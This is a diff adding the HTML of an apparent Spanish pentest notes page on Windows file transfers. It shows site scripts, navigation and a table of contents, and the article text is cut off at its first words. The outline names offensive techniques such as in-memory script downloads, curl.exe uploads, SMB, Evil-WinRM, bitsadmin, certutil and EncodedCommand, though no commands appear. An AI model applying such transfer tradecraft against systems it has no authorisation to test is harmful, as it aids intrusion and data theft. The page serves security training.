@@ -1,0 +1,951 @@
+<!DOCTYPE html><html lang="es" data-theme="dful-dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width"><script>
+      (() => {
+        const storageKey = 'dful-theme';
+        const schemaKey = 'dful-theme-schema';
+        const schemaVersion = '2';
+        const legacyStorageKey = 'dful-theme-preview';
+        const valid = new Set(["dful-dark","amber-dark","dful-light","flexoki-paper","phosphor","arcade","cobalt"]);
+        const dark = new Set(["dful-dark","amber-dark","phosphor","arcade","cobalt"]);
+        const fallback = "dful-dark";
+        let theme = fallback;
+        try {
+          const needsMigration = localStorage.getItem(schemaKey) !== schemaVersion;
+          let stored = localStorage.getItem(storageKey);
+          if (needsMigration) {
+            if (stored === 'graphite') stored = 'dful-dark';
+            else if (stored === 'dful-dark') stored = 'amber-dark';
+            localStorage.setItem(schemaKey, schemaVersion);
+            if (stored) localStorage.setItem(storageKey, stored);
+          }
+          if (valid.has(stored)) theme = stored;
+          else {
+            let legacy = localStorage.getItem(legacyStorageKey);
+            if (needsMigration) {
+              if (legacy === 'graphite') legacy = 'dful-dark';
+              else if (legacy === 'dful-dark') legacy = 'amber-dark';
+            }
+            if (valid.has(legacy)) {
+              theme = legacy;
+              localStorage.setItem(storageKey, legacy);
+            }
+            if (legacy) localStorage.removeItem(legacyStorageKey);
+          }
+          localStorage.setItem(storageKey, theme);
+        } catch {}
+        document.documentElement.dataset.theme = theme;
+        document.documentElement.style.colorScheme = dark.has(theme) ? 'dark' : 'light';
+      })();</script><meta name="description" content="Métodos prácticos para transferir archivos en Windows desde shells, sesiones remotas y redes restringidas durante un pentest."><link rel="canonical" href="https://dful.github.io/es/notes/transferencias-de-archivos-en-windows/"><link rel="alternate" hreflang="es" href="https://dful.github.io/es/notes/transferencias-de-archivos-en-windows/"><link rel="alternate" hreflang="en" href="https://dful.github.io/en/notes/windows-file-transfers/"><link rel="alternate" hreflang="x-default" href="https://dful.github.io/en/notes/windows-file-transfers/"><meta property="og:url" content="https://dful.github.io/es/notes/transferencias-de-archivos-en-windows/"><meta property="og:type" content="website"><meta property="og:site_name" content="dful"><meta property="og:title" content="Transferencias de archivos en Windows · dful"><meta property="og:description" content="Métodos prácticos para transferir archivos en Windows desde shells, sesiones remotas y redes restringidas durante un pentest."><meta property="og:locale" content="es_ES"><meta property="og:locale:alternate" content="en_GB"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Transferencias de archivos en Windows · dful"><meta name="twitter:description" content="Métodos prácticos para transferir archivos en Windows desde shells, sesiones remotas y redes restringidas durante un pentest."><meta name="generator" content="Astro v7.3.2"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><title>Transferencias de archivos en Windows · dful</title><link rel="stylesheet" href="/_astro/notes.DkEzeG-w.css"><link rel="stylesheet" href="/_astro/BaseLayout.l85KjHsw.css"><link rel="stylesheet" href="/_astro/publishing.C5o61NTe.css"></head><body><a class="skip-link" href="#main">Saltar al contenido</a><header class="site-header"><div class="header-inner"><a class="wordmark" href="/es/" aria-label="dful · Inicio">dful<span>.</span></a><nav class="primary-nav" aria-label="Principal"><a href="/es/" data-active="false">Inicio</a><a href="/es/notes/" data-active="true" aria-current="page">Notas</a><a href="/es/research/" data-active="false">Artículos</a><a href="/es/about/" data-active="false">About</a></nav><div class="header-actions"><details class="theme-picker" data-theme-picker data-astro-cid-hcqnpaxe><summary aria-label="Tema" data-astro-cid-hcqnpaxe><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 3.25a8.75 8.75 0 1 0 0 17.5h1.25a2.25 2.25 0 0 0 0-4.5h-.75a1.75 1.75 0 0 1 0-3.5h2.35A5.9 5.9 0 0 0 20.75 6.9C18.72 4.63 15.72 3.25 12 3.25Z"></path><circle cx="7.4" cy="10" r=".7" fill="currentColor" stroke="none"></circle><circle cx="9.25" cy="6.9" r=".7" fill="currentColor" stroke="none"></circle><circle cx="13" cy="6.2" r=".7" fill="currentColor" stroke="none"></circle><circle cx="16.25" cy="8" r=".7" fill="currentColor" stroke="none"></circle></svg><span class="theme-current" data-theme-current data-astro-cid-hcqnpaxe>Dful Dark</span></summary><div class="theme-menu" aria-label="Tema" data-astro-cid-hcqnpaxe><div class="theme-menu-head" data-astro-cid-hcqnpaxe>Tema</div><button type="button" aria-pressed="true" data-theme-option="dful-dark" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#111214" data-astro-cid-hcqnpaxe></i><i style="--swatch:#f0eee8" data-astro-cid-hcqnpaxe></i><i style="--swatch:#ff8b3d" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Dful Dark</span></button><button type="button" aria-pressed="false" data-theme-option="amber-dark" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#0c0c0b" data-astro-cid-hcqnpaxe></i><i style="--swatch:#f2efe7" data-astro-cid-hcqnpaxe></i><i style="--swatch:#ff9f2f" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Amber Dark</span></button><button type="button" aria-pressed="false" data-theme-option="dful-light" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#f7f3ea" data-astro-cid-hcqnpaxe></i><i style="--swatch:#171511" data-astro-cid-hcqnpaxe></i><i style="--swatch:#b94d08" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Dful Light</span></button><button type="button" aria-pressed="false" data-theme-option="flexoki-paper" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#fffcf0" data-astro-cid-hcqnpaxe></i><i style="--swatch:#100f0f" data-astro-cid-hcqnpaxe></i><i style="--swatch:#bc5215" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Flexoki Paper</span></button><button type="button" aria-pressed="false" data-theme-option="phosphor" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#030604" data-astro-cid-hcqnpaxe></i><i style="--swatch:#c8f7cf" data-astro-cid-hcqnpaxe></i><i style="--swatch:#48ff78" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Phosphor</span></button><button type="button" aria-pressed="false" data-theme-option="arcade" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#11102b" data-astro-cid-hcqnpaxe></i><i style="--swatch:#fff4d7" data-astro-cid-hcqnpaxe></i><i style="--swatch:#4de9ff" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Arcade</span></button><button type="button" aria-pressed="false" data-theme-option="cobalt" data-astro-cid-hcqnpaxe><span class="theme-swatches" aria-hidden="true" data-astro-cid-hcqnpaxe><i style="--swatch:#07111f" data-astro-cid-hcqnpaxe></i><i style="--swatch:#edf6ff" data-astro-cid-hcqnpaxe></i><i style="--swatch:#42b9ff" data-astro-cid-hcqnpaxe></i></span><span data-astro-cid-hcqnpaxe>Cobalt</span></button></div></details><script>
+  (() => {
+    const storageKey = 'dful-theme';
+    const themes = [{"id":"dful-dark","name":"Dful Dark","colorScheme":"dark"},{"id":"amber-dark","name":"Amber Dark","colorScheme":"dark"},{"id":"dful-light","name":"Dful Light","colorScheme":"light"},{"id":"flexoki-paper","name":"Flexoki Paper","colorScheme":"light"},{"id":"phosphor","name":"Phosphor","colorScheme":"dark"},{"id":"arcade","name":"Arcade","colorScheme":"dark"},{"id":"cobalt","name":"Cobalt","colorScheme":"dark"}];
+    const valid = new Set(themes.map(({ id }) => id));
+    const names = Object.fromEntries(themes.map(({ id, name }) => [id, name]));
+    const isDark = (theme) => themes.find((item) => item.id === theme)?.colorScheme === 'dark';
+    const apply = (theme) => {
+      const selected = valid.has(theme) ? theme : "dful-dark";
+      document.documentElement.dataset.theme = selected;
+      document.documentElement.style.colorScheme = isDark(selected) ? 'dark' : 'light';
+      try { localStorage.setItem(storageKey, selected); } catch {}
+      document.querySelectorAll('[data-theme-picker]').forEach((picker) => {
+        const current = picker.querySelector('[data-theme-current]');
+        if (current) current.textContent = names[selected];
+        picker.querySelectorAll('[data-theme-option]').forEach((button) => button.setAttribute('aria-pressed', button.getAttribute('data-theme-option') === selected ? 'true' : 'false'));
+      });
+    };
+    const enhance = () => {
+      document.querySelectorAll('[data-theme-picker]:not([data-enhanced])').forEach((picker) => {
+        picker.setAttribute('data-enhanced','true');
+        picker.addEventListener('keydown', (event) => {
+          if (event.key === 'Escape' && picker.open) {
+            picker.removeAttribute('open');
+            picker.querySelector('summary').focus();
+          }
+        });
+        picker.querySelectorAll('[data-theme-option]').forEach((button) => button.addEventListener('click', () => {
+          apply(button.getAttribute('data-theme-option'));
+          picker.removeAttribute('open');
+          picker.querySelector('summary').focus();
+        }));
+      });
+      let stored = "dful-dark";
+      try { stored = localStorage.getItem(storageKey) || stored; } catch {}
+      apply(stored);
+    };
+    enhance();
+    document.addEventListener('astro:page-load', enhance);
+  })();</script><nav class="lang-switch" aria-label="Cambiar idioma"><a href="/en/notes/windows-file-transfers/" data-active="false">EN</a><a href="/es/notes/transferencias-de-archivos-en-windows/" data-active="true" aria-current="page">ES</a></nav><div class="social-links" aria-label="Perfiles sociales"><a href="https://github.com/dful" rel="me">GitHub</a><a href="https://www.linkedin.com/in/daniel-fulladosa/" rel="me">LinkedIn</a></div></div></div></header><main id="main"><div class="notes-page" data-note-slug="transferencias-de-archivos-en-windows"><div class="notes-shell"><aside class="notes-tree" aria-label="Árbol de conocimiento"><div class="notes-side-head"><strong>Árbol de conocimiento</strong></div><script>
+  (() => { document.documentElement.setAttribute('data-notes-tree-pending', 'true'); })();
+</script><ul class="knowledge-tree" data-notes-tree data-notes-tree-locale="es"><li data-depth="0" data-node-type="category" data-tree-key="domain:ai" data-active-path="false"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="2.5"></circle><circle cx="5" cy="6" r="1.75"></circle><circle cx="19" cy="6" r="1.75"></circle><circle cx="12" cy="20" r="1.75"></circle><path d="m10.2 10.4-3.8-3.2m7.4 3.2 3.8-3.2M12 14.5v3.75"></path></svg></span><span>AI</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:fundamentals" data-active-path="false"><details><summary><span>Fundamentos</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:tokens-y-contexto" data-active-path="false"><a href="/es/notes/tokens-y-contexto/"><span>Tokens y contexto</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inferencia" data-active-path="false"><a href="/es/notes/inferencia/"><span>Inferencia</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:razonamiento" data-active-path="false"><a href="/es/notes/razonamiento/"><span>Razonamiento</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:ingenieria-contexto" data-active-path="false"><a href="/es/notes/ingenieria-contexto/"><span>Ingeniería de contexto</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:agents" data-active-path="false"><details><summary><span>Agentes</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:bucle-agente" data-active-path="false"><a href="/es/notes/bucle-agente/"><span>Bucle de agente</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:harness-agente" data-active-path="false"><a href="/es/notes/harness-agente/"><span>Harness de agente</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:uso-herramientas" data-active-path="false"><a href="/es/notes/uso-herramientas/"><span>Uso de herramientas</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:subagentes" data-active-path="false"><a href="/es/notes/subagentes/"><span>Subagentes</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:security" data-active-path="false"><details><summary><span>Seguridad</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:inyeccion-de-prompts" data-active-path="false"><a href="/es/notes/inyeccion-de-prompts/"><span>Prompt Injection</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:permisos-de-agentes" data-active-path="false"><a href="/es/notes/permisos-de-agentes/"><span>Permisos de agentes</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:sandboxing-y-egress" data-active-path="false"><a href="/es/notes/sandboxing-y-egress/"><span>Sandboxing y egress</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:applied-ai" data-active-path="false"><details><summary><span>IA aplicada</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:apis-modelos" data-active-path="false"><a href="/es/notes/apis-modelos/"><span>APIs de modelos</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:costes-api" data-active-path="false"><a href="/es/notes/costes-api/"><span>Costes de API</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:modelos-despliegue" data-active-path="false"><a href="/es/notes/modelos-despliegue/"><span>Modelos de despliegue</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inferencia-local" data-active-path="false"><a href="/es/notes/inferencia-local/"><span>Inferencia local</span></a></li></ul></details></li></ul></details></li><li data-depth="0" data-node-type="category" data-tree-key="domain:offensive-security" data-active-path="true"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 2.75 19 5.4v5.45c0 4.65-2.8 8.15-7 10.4-4.2-2.25-7-5.75-7-10.4V5.4L12 2.75Z"></path><path d="m9 12 2 2 4-4"></path></svg></span><span>Seguridad ofensiva</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:shells" data-active-path="false"><details><summary><span>Shells</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:acceso-remoto" data-active-path="false"><a href="/es/notes/acceso-remoto/"><span>Acceso remoto</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:file-transfer" data-active-path="true"><details open><summary><span>Transferencia de archivos</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:transferencias-de-archivos-en-windows" data-active-path="true"><a href="/es/notes/transferencias-de-archivos-en-windows/" aria-current="page"><span>Transferencias de archivos en Windows</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:transferencias-de-archivos-en-linux" data-active-path="false"><a href="/es/notes/transferencias-de-archivos-en-linux/"><span>Transferencias de archivos en Linux</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:web-applications" data-active-path="false"><details><summary><span>Aplicaciones web</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:pruebas-web-php" data-active-path="false"><a href="/es/notes/pruebas-web-php/"><span>PHP Web Testing</span></a></li></ul></details></li></ul></details></li></ul><script>
+  (() => {
+    if (globalThis.__dfulNotesTreeState) return;
+    globalThis.__dfulNotesTreeState = true;
+    const storagePrefix = 'dful-notes-tree:v1:';
+    let syncing = false;
+    const ignoredToggles = new WeakSet();
+
+    const trees = () => [...document.querySelectorAll('[data-notes-tree]')];
+    const details = () => trees().flatMap((tree) => [...tree.querySelectorAll('[data-tree-key] > details')]);
+    const keyFor = (detail) => detail.parentElement?.getAttribute('data-tree-key');
+    const activePath = (detail) => detail.parentElement?.getAttribute('data-active-path') === 'true';
+    const localeFor = () => document.querySelector('[data-notes-tree-locale]')?.getAttribute('data-notes-tree-locale') || 'en';
+    const storageKey = () => `${storagePrefix}${localeFor()}`;
+
+    const readState = () => {
+      try {
+        const parsed = JSON.parse(localStorage.getItem(storageKey()) || '{}');
+        return parsed && typeof parsed === 'object' ? parsed : {};
+      } catch {
+        return {};
+      }
+    };
+
+    const writeState = (state) => {
+      try { localStorage.setItem(storageKey(), JSON.stringify(state)); } catch {}
+    };
+
+    const syncKey = (key, open) => {
+      syncing = true;
+      details().filter((detail) => keyFor(detail) === key).forEach((detail) => {
+        if (detail.open === open) return;
+        ignoredToggles.add(detail);
+        detail.open = open;
+      });
+      syncing = false;
+    };
+
+    const applyState = () => {
+      const state = readState();
+      syncing = true;
+      details().forEach((detail) => {
+        const key = keyFor(detail);
+        if (!key) return;
+        const item = detail.parentElement;
+        const defaultOpen = item?.getAttribute('data-depth') === '0';
+        detail.open = activePath(detail) || (typeof state[key] === 'boolean' ? state[key] : defaultOpen);
+      });
+      syncing = false;
+    };
+
+    const enhance = () => {
+      if (!trees().length) {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+        return;
+      }
+      try {
+        applyState();
+      } finally {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+      }
+      details().filter((detail) => !detail.hasAttribute('data-tree-state-bound')).forEach((detail) => {
+        detail.setAttribute('data-tree-state-bound', 'true');
+        detail.addEventListener('toggle', () => {
+          if (ignoredToggles.delete(detail)) return;
+          if (syncing) return;
+          const key = keyFor(detail);
+          if (!key) return;
+          if (activePath(detail) && !detail.open) {
+            const state = readState();
+            state[key] = false;
+            writeState(state);
+            syncKey(key, true);
+            return;
+          }
+          const state = readState();
+          state[key] = detail.open;
+          writeState(state);
+          syncKey(key, detail.open);
+        });
+      });
+    };
+
+    document.addEventListener('astro:page-load', enhance);
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enhance, { once:true });
+    else enhance();
+  })();
+</script></aside><div class="notes-detail-shell"><article class="notes-article"><div class="notes-mobile-nav"><details><summary>Árbol de conocimiento</summary><div><script>
+  (() => { document.documentElement.setAttribute('data-notes-tree-pending', 'true'); })();
+</script><ul class="knowledge-tree" data-notes-tree data-notes-tree-locale="es"><li data-depth="0" data-node-type="category" data-tree-key="domain:ai" data-active-path="false"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="12" r="2.5"></circle><circle cx="5" cy="6" r="1.75"></circle><circle cx="19" cy="6" r="1.75"></circle><circle cx="12" cy="20" r="1.75"></circle><path d="m10.2 10.4-3.8-3.2m7.4 3.2 3.8-3.2M12 14.5v3.75"></path></svg></span><span>AI</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:fundamentals" data-active-path="false"><details><summary><span>Fundamentos</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:tokens-y-contexto" data-active-path="false"><a href="/es/notes/tokens-y-contexto/"><span>Tokens y contexto</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inferencia" data-active-path="false"><a href="/es/notes/inferencia/"><span>Inferencia</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:razonamiento" data-active-path="false"><a href="/es/notes/razonamiento/"><span>Razonamiento</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:ingenieria-contexto" data-active-path="false"><a href="/es/notes/ingenieria-contexto/"><span>Ingeniería de contexto</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:agents" data-active-path="false"><details><summary><span>Agentes</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:bucle-agente" data-active-path="false"><a href="/es/notes/bucle-agente/"><span>Bucle de agente</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:harness-agente" data-active-path="false"><a href="/es/notes/harness-agente/"><span>Harness de agente</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:uso-herramientas" data-active-path="false"><a href="/es/notes/uso-herramientas/"><span>Uso de herramientas</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:subagentes" data-active-path="false"><a href="/es/notes/subagentes/"><span>Subagentes</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:security" data-active-path="false"><details><summary><span>Seguridad</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:inyeccion-de-prompts" data-active-path="false"><a href="/es/notes/inyeccion-de-prompts/"><span>Prompt Injection</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:permisos-de-agentes" data-active-path="false"><a href="/es/notes/permisos-de-agentes/"><span>Permisos de agentes</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:sandboxing-y-egress" data-active-path="false"><a href="/es/notes/sandboxing-y-egress/"><span>Sandboxing y egress</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:ai:applied-ai" data-active-path="false"><details><summary><span>IA aplicada</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:apis-modelos" data-active-path="false"><a href="/es/notes/apis-modelos/"><span>APIs de modelos</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:costes-api" data-active-path="false"><a href="/es/notes/costes-api/"><span>Costes de API</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:modelos-despliegue" data-active-path="false"><a href="/es/notes/modelos-despliegue/"><span>Modelos de despliegue</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:inferencia-local" data-active-path="false"><a href="/es/notes/inferencia-local/"><span>Inferencia local</span></a></li></ul></details></li></ul></details></li><li data-depth="0" data-node-type="category" data-tree-key="domain:offensive-security" data-active-path="true"><details open><summary><span class="tree-category-icon"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M12 2.75 19 5.4v5.45c0 4.65-2.8 8.15-7 10.4-4.2-2.25-7-5.75-7-10.4V5.4L12 2.75Z"></path><path d="m9 12 2 2 4-4"></path></svg></span><span>Seguridad ofensiva</span></summary><ul><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:shells" data-active-path="false"><details><summary><span>Shells</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:acceso-remoto" data-active-path="false"><a href="/es/notes/acceso-remoto/"><span>Acceso remoto</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:file-transfer" data-active-path="true"><details open><summary><span>Transferencia de archivos</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:transferencias-de-archivos-en-windows" data-active-path="true"><a href="/es/notes/transferencias-de-archivos-en-windows/" aria-current="page"><span>Transferencias de archivos en Windows</span></a></li><li data-depth="2" data-node-type="note" data-tree-key="note:transferencias-de-archivos-en-linux" data-active-path="false"><a href="/es/notes/transferencias-de-archivos-en-linux/"><span>Transferencias de archivos en Linux</span></a></li></ul></details></li><li data-depth="1" data-node-type="category" data-tree-key="category:domain:offensive-security:web-applications" data-active-path="false"><details><summary><span>Aplicaciones web</span></summary><ul><li data-depth="2" data-node-type="note" data-tree-key="note:pruebas-web-php" data-active-path="false"><a href="/es/notes/pruebas-web-php/"><span>PHP Web Testing</span></a></li></ul></details></li></ul></details></li></ul><script>
+  (() => {
+    if (globalThis.__dfulNotesTreeState) return;
+    globalThis.__dfulNotesTreeState = true;
+    const storagePrefix = 'dful-notes-tree:v1:';
+    let syncing = false;
+    const ignoredToggles = new WeakSet();
+
+    const trees = () => [...document.querySelectorAll('[data-notes-tree]')];
+    const details = () => trees().flatMap((tree) => [...tree.querySelectorAll('[data-tree-key] > details')]);
+    const keyFor = (detail) => detail.parentElement?.getAttribute('data-tree-key');
+    const activePath = (detail) => detail.parentElement?.getAttribute('data-active-path') === 'true';
+    const localeFor = () => document.querySelector('[data-notes-tree-locale]')?.getAttribute('data-notes-tree-locale') || 'en';
+    const storageKey = () => `${storagePrefix}${localeFor()}`;
+
+    const readState = () => {
+      try {
+        const parsed = JSON.parse(localStorage.getItem(storageKey()) || '{}');
+        return parsed && typeof parsed === 'object' ? parsed : {};
+      } catch {
+        return {};
+      }
+    };
+
+    const writeState = (state) => {
+      try { localStorage.setItem(storageKey(), JSON.stringify(state)); } catch {}
+    };
+
+    const syncKey = (key, open) => {
+      syncing = true;
+      details().filter((detail) => keyFor(detail) === key).forEach((detail) => {
+        if (detail.open === open) return;
+        ignoredToggles.add(detail);
+        detail.open = open;
+      });
+      syncing = false;
+    };
+
+    const applyState = () => {
+      const state = readState();
+      syncing = true;
+      details().forEach((detail) => {
+        const key = keyFor(detail);
+        if (!key) return;
+        const item = detail.parentElement;
+        const defaultOpen = item?.getAttribute('data-depth') === '0';
+        detail.open = activePath(detail) || (typeof state[key] === 'boolean' ? state[key] : defaultOpen);
+      });
+      syncing = false;
+    };
+
+    const enhance = () => {
+      if (!trees().length) {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+        return;
+      }
+      try {
+        applyState();
+      } finally {
+        document.documentElement.removeAttribute('data-notes-tree-pending');
+      }
+      details().filter((detail) => !detail.hasAttribute('data-tree-state-bound')).forEach((detail) => {
+        detail.setAttribute('data-tree-state-bound', 'true');
+        detail.addEventListener('toggle', () => {
+          if (ignoredToggles.delete(detail)) return;
+          if (syncing) return;
+          const key = keyFor(detail);
+          if (!key) return;
+          if (activePath(detail) && !detail.open) {
+            const state = readState();
+            state[key] = false;
+            writeState(state);
+            syncKey(key, true);
+            return;
+          }
+          const state = readState();
+          state[key] = detail.open;
+          writeState(state);
+          syncKey(key, detail.open);
+        });
+      });
+    };
+
+    document.addEventListener('astro:page-load', enhance);
+    if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', enhance, { once:true });
+    else enhance();
+  })();
+</script></div></details><details><summary>En esta página</summary><div><ul><li data-depth="2"><a href="#referencia-rápida">Referencia rápida</a></li><li data-depth="2"><a href="#http">HTTP</a></li><li data-depth="3"><a href="#preparar-el-attacker">Preparar el attacker</a></li><li data-depth="3"><a href="#download">Download</a></li><li data-depth="3"><a href="#descargar-scripts-sin-guardarlos-primero">Descargar scripts sin guardarlos primero</a></li><li data-depth="3"><a href="#reanudar-una-descarga-grande">Reanudar una descarga grande</a></li><li data-depth="2"><a href="#http-upload">HTTP upload</a></li><li data-depth="3"><a href="#preparar-uploadserver">Preparar uploadserver</a></li><li data-depth="3"><a href="#upload-con-curlexe">Upload con curl.exe</a></li><li data-depth="3"><a href="#certreqexe">certreq.exe</a></li><li data-depth="2"><a href="#smb">SMB</a></li><li data-depth="3"><a href="#preparar-impacket-smb">Preparar Impacket SMB</a></li><li data-depth="3"><a href="#download-1">Download</a></li><li data-depth="3"><a href="#upload">Upload</a></li><li data-depth="3"><a href="#sesiones-smb-existentes-y-error-1219">Sesiones SMB existentes y error 1219</a></li><li data-depth="3"><a href="#ficheros-grandes">Ficheros grandes</a></li><li data-depth="3"><a href="#binarios-nativos-alternativos-para-smb">Binarios nativos alternativos para SMB</a></li><li data-depth="2"><a href="#webdav">WebDAV</a></li><li data-depth="3"><a href="#preparar-el-attacker-1">Preparar el attacker</a></li><li data-depth="3"><a href="#download-2">Download</a></li><li data-depth="3"><a href="#upload-1">Upload</a></li><li data-depth="3"><a href="#requisito-de-webclient">Requisito de WebClient</a></li><li data-depth="2"><a href="#acceso-remoto-existente">Acceso remoto existente</a></li><li data-depth="3"><a href="#evil-winrm">Evil-WinRM</a></li><li data-depth="3"><a href="#powershell-remoting">PowerShell Remoting</a></li><li data-depth="3"><a href="#rdp-drive-redirection">RDP drive redirection</a></li><li data-depth="2"><a href="#openssh">OpenSSH</a></li><li data-depth="3"><a href="#scp">SCP</a></li><li data-depth="3"><a href="#sftp">SFTP</a></li><li data-depth="2"><a href="#ftp">FTP</a></li><li data-depth="3"><a href="#preparar-el-attacker-2">Preparar el attacker</a></li><li data-depth="3"><a href="#transferencia-interactiva">Transferencia interactiva</a></li><li data-depth="3"><a href="#ftp-desde-una-shell-no-interactiva">FTP desde una shell no interactiva</a></li><li data-depth="2"><a href="#bits">BITS</a></li><li data-depth="3"><a href="#start-bitstransfer">Start-BitsTransfer</a></li><li data-depth="3"><a href="#bitsadminexe">bitsadmin.exe</a></li><li data-depth="2"><a href="#canales-solo-texto">Canales solo-texto</a></li><li data-depth="3"><a href="#base64-con-powershell">Base64 con PowerShell</a></li><li data-depth="3"><a href="#certutil-encode-y-decode">certutil encode y decode</a></li><li data-depth="3"><a href="#encodedcommand">EncodedCommand</a></li><li data-depth="2"><a href="#métodos-nativos-adicionales">Métodos nativos adicionales</a></li><li data-depth="3"><a href="#certreqexe-1">certreq.exe</a></li><li data-depth="3"><a href="#esentutlexe">esentutl.exe</a></li><li data-depth="3"><a href="#expandexe">expand.exe</a></li><li data-depth="3"><a href="#findstrexe">findstr.exe</a></li><li data-depth="2"><a href="#preparar-ficheros">Preparar ficheros</a></li><li data-depth="3"><a href="#tarexe">tar.exe</a></li><li data-depth="3"><a href="#compress-archive">Compress-Archive</a></li><li data-depth="2"><a href="#integridad">Integridad</a></li><li data-depth="2"><a href="#codificación-de-caracteres">Codificación de caracteres</a></li><li data-depth="3"><a href="#windows-powershell-51">Windows PowerShell 5.1</a></li><li data-depth="3"><a href="#powershell-7">PowerShell 7+</a></li><li data-depth="3"><a href="#inspeccionar-los-bytes">Inspeccionar los bytes</a></li><li data-depth="2"><a href="#referencias">Referencias</a></li></ul></div></details></div><header class="notes-header"><div class="notes-header-pretitle"><nav class="notes-breadcrumb" aria-label="Migas de pan"><span>Seguridad ofensiva</span><i aria-hidden="true">/</i><span>Transferencia de archivos</span></nav></div><h1>Transferencias de archivos en Windows</h1><div class="notes-deck">Métodos prácticos para transferir archivos en Windows desde shells, sesiones remotas y redes restringidas durante un pentest.</div><small>Actualizado 25 ago 2026</small></header><div class="publishing-prose"><p>Durante un 